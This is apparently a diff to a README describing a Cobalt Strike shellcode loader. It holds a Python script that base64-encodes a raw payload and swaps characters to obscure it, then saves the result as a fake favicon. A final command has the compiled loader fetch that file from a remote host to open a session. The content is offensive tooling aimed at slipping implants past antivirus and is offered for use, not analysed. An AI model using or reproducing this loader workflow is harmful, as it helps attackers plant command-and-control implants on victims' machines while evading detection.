@@ -1,5 +1,32 @@
+# 0x00 generate cobaltstrike shellcode
 
-### change
+`Attacks =>> Packages =>> Payload generate =>> Output =>> Raw =>> payload.bin`
+
+# 0x01 replace base64 shellcode
+
+```
+import base64
+import random
+import numpy
+import sys
+
+# print len(sys.argv)
+# print sys.argv[0]
+# print sys.argv[1]
+
+if len(sys.argv) != 2:
+    sys.exit("[+] useage: python %s [File: payload.bin]"%sys.argv[0])
+else:
+    shellcode =  open("payload.bin","rb").read()
+    b64shellcode = base64.b64encode(shellcode).decode()
+    b64shellcode = b64shellcode.replace("A","#").replace("H","!").replace("1","@").replace("T",")")
+    print("[+] b64shellcode= \n" + b64shellcode)
+    f = open("favicon.txt","wb")
+    f.write(b64shellcode)
+    f.close()
+```
+
+# 0x02 comiple mian.go
 
 
 ```
@@ -83,6 +110,8 @@ func main() {
 }
 
 ```
+
+# 0x03 get session
 
 **shell.exe -u http://172.16.242.1/favicon.ico**
 
